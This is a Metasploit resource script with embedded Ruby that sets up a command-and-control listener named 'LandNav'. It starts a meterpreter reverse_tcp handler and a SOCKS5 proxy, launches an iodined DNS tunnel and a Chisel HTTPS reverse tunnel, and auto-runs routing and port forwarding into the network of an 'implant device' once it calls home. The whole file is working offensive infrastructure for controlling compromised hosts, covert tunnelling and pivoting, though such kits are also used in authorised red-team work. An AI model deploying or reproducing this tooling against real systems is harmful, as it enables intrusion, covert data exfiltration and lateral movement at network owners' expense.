# LandNav C2 Listener — auto-route + portfwd + SOCKS on session
# Usage: msfconsole -r /opt/pr0t31n/LandNav/listener.rc
#
# Starts a python/meterpreter/reverse_tcp handler on :4443.
# On session open, automatically:
#   1. Adds routes for all subnets (autoroute)
#   2. Port-forwards beretta services to c2-server high ports
#      (c2-server hosts its own Vantage/Crucible/Nessus on the standard ports)
#
# SOCKS proxy is available on :1080 but prefer the port forwards —
# Python meterpreter is single-threaded and heavy SOCKS browsing
# (especially WebSocket/SocketIO apps) starves the command channel.

# ── Pre-flight: auto_commands + iodined + key check ───────────
<ruby>
require 'yaml'
require 'set'

LANDNAV_DIR = '/opt/pr0t31n/LandNav'
CONFIG_PATH = "#{LANDNAV_DIR}/config.yaml"

cfg = {}
if File.exist?(CONFIG_PATH)
  cfg = YAML.safe_load(File.read(CONFIG_PATH)) || {}
end

# ── 1. Config sync + portfwd stripping ───────────────────────
# prep_handler.py now also merges missing config sections from
# config.yaml.example and applies version migrations (e.g. chisel
# port 443→8443).  Re-read config afterward so later sections
# (chisel server, iodined) use the updated values.
prep = "#{LANDNAV_DIR}/prep_handler.py"
if File.exist?(prep)
  ret = system("python3 #{prep} -c #{CONFIG_PATH} 2>/dev/null")
  if ret
    print_line("[*] auto_commands.txt prepared (SSH-tunnel portfwd stripped)")
    # Re-read config — prep_handler.py may have migrated values
    if File.exist?(CONFIG_PATH)
      cfg = YAML.safe_load(File.read(CONFIG_PATH)) || {}
    end
  else
    print_line("[!] prep_handler.py failed — using auto_commands.txt as-is")
  end
else
  print_line("[*] prep_handler.py not found — using auto_commands.txt as-is")
end

# ── 2. SSH tunnel key verification ────────────────────────────
tunnel_cfg = cfg['ssh_tunnels'] || {}
key_path = tunnel_cfg['key_path'] || "#{LANDNAV_DIR}/keys/tunnel_key"
if File.exist?(key_path)
  print_line("[*] SSH tunnel key: #{key_path} ✓")
  pub_path = "#{key_path}.pub"
  if File.exist?(pub_path)
    ak_path = File.expand_path("~/.ssh/authorized_keys")
    pub_content = File.read(pub_path).strip
    if File.exist?(ak_path) && File.read(ak_path).include?(pub_content.split(' ')[1])
      print_line("[*] SSH tunnel pubkey in authorized_keys ✓")
    else
      print_line("[!] SSH tunnel pubkey NOT in #{ak_path}")
      print_line("[!]   Run: cat #{pub_path} >> #{ak_path}")
    end
  end
else
  print_line("[!] SSH tunnel key missing: #{key_path}")
  print_line("[!]   Run: ssh-keygen -t ed25519 -f #{key_path} -N ''")
  print_line("[!]   Then push keys/ to the implant device")
end

# ── 3. Start iodined (DNS tunnel server) ─────────────────────
dns_cfg = cfg['dns_tunnel'] || {}
if dns_cfg.fetch('enabled', true)
  domain = dns_cfg['domain']
  password = dns_cfg['password']

  if domain && !domain.empty? && password && !password.empty?
    if system("command -v iodined >/dev/null 2>&1")
      if system("pgrep -x iodined >/dev/null 2>&1")
        print_line("[*] iodined already running ✓")
      else
        # Check NS delegation
        ns_out = `dig +short NS #{domain} 2>/dev/null`.strip
        if ns_out.empty?
          print_line("[!] No NS delegation for #{domain}")
          c2_host = (cfg['c2'] || {})['host'] || 'c2.example.com'
          print_line("[!]   Add at domain registrar: #{domain}. IN NS #{c2_host}.")
          print_line("[!]   DNS tunnel will fail until delegation is set up")
        else
          print_line("[*] NS delegation for #{domain}: #{ns_out}")
        end

        # Start iodined — daemon mode (no -f), backgrounds itself
        tunnel_net = dns_cfg['tunnel_net'] || '10.53.53.1/24'
        if system("iodined -c -P '#{password}' #{tunnel_net} #{domain} 2>/dev/null")
          print_line("[*] iodined started: #{domain} (net #{tunnel_net})")
        else
          # Common cause: port 53 already in use
          if system("ss -tlnp sport = :53 >/dev/null 2>&1")
            in_use = `ss -tlnp sport = :53 2>/dev/null`.strip.split("\n").last
            print_line("[!] iodined failed — port 53 in use: #{in_use}")
          else
            print_line("[!] iodined failed (not root? iodined not suid?)")
          end
        end
      end
    else
      print_line("[!] iodined not installed — DNS tunnel unavailable")
      print_line("[!]   Install: apt-get install -y iodine")
    end
  else
    print_line("[*] DNS tunnel: domain/password not configured — skipping")
  end
else
  print_line("[*] DNS tunnel disabled in config")
end

# ── 4. Start Chisel server (HTTPS reverse tunnel) ────────────
chisel_cfg = cfg['chisel'] || {}
if chisel_cfg.fetch('enabled', false)
  if system("command -v chisel >/dev/null 2>&1")
    if system("pgrep -xf 'chisel server' >/dev/null 2>&1")
      print_line("[*] Chisel server already running ✓")
    else
      chisel_port = chisel_cfg['server_port'] || 8443
      chisel_auth = chisel_cfg['auth'] || ''
      chisel_tls = chisel_cfg.fetch('tls', true)

      chisel_cmd = "chisel server --reverse --port #{chisel_port}"
      chisel_cmd += " --auth '#{chisel_auth}'" unless chisel_auth.empty?

      if chisel_tls
        # Chisel auto-generates a self-signed TLS cert if none provided
        key_file = chisel_cfg['tls_key'] || ''
        cert_file = chisel_cfg['tls_cert'] || ''
        if !key_file.empty? && !cert_file.empty? && File.exist?(key_file)
          chisel_cmd += " --tls-key #{key_file} --tls-cert #{cert_file}"
        else
          chisel_cmd += " --tls-key '' --tls-cert ''"
        end
      end

      # Background — setsid detaches from msfconsole's process group
      chisel_cmd += " </dev/null >/var/log/chisel.log 2>&1 &"
      if system("setsid #{chisel_cmd}")
        sleep(1)
        if system("pgrep -xf 'chisel server' >/dev/null 2>&1")
          print_line("[*] Chisel server started on :#{chisel_port} (TLS=#{chisel_tls})")
        else
          print_line("[!] Chisel server failed to start — check /var/log/chisel.log")
        end
      else
        print_line("[!] Chisel server failed to launch")
      end
    end
  else
    print_line("[!] chisel not installed — HTTPS tunnel unavailable")
    print_line("[!]   Install: go install github.com/jpillora/chisel@latest")
    print_line("[!]   Or download from github.com/jpillora/chisel/releases")
  end
else
  print_line("[*] Chisel disabled in config")
end

print_line("")
</ruby>

# ── SOCKS Proxy (start first so it's ready when session arrives) ──
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# ── Listener ──
use exploit/multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 10.20.70.172
set LPORT 4443
set ExitOnSession false

# Keep sessions alive over lossy / NAT'd links.
# DO NOT use 0 — the Python meterpreter stage interprets 0 as
# "expire immediately" (communication_last + 0 < time.time() is True
# after one select() cycle).  The stage's session_has_expired handles
# 0 correctly but communication_has_expired does NOT.  Use large
# non-zero values instead.
set SessionCommunicationTimeout 3600
set SessionExpirationTimeout 604800

# Auto-run on session open: autoroute + portfwd from file
# (avoids .rc quoting issues with multi_console_command -c)
set AutoRunScript multi_console_command -r /opt/pr0t31n/LandNav/auto_commands.txt

run -j

echo ""
echo "════════════════════════════════════════════════════"
echo " LandNav listener active on 10.20.70.172:4443"
echo " SOCKS5 proxy on :1080 (routes through sessions)"
echo " Waiting for beretta call-home..."
echo "════════════════════════════════════════════════════"
echo ""
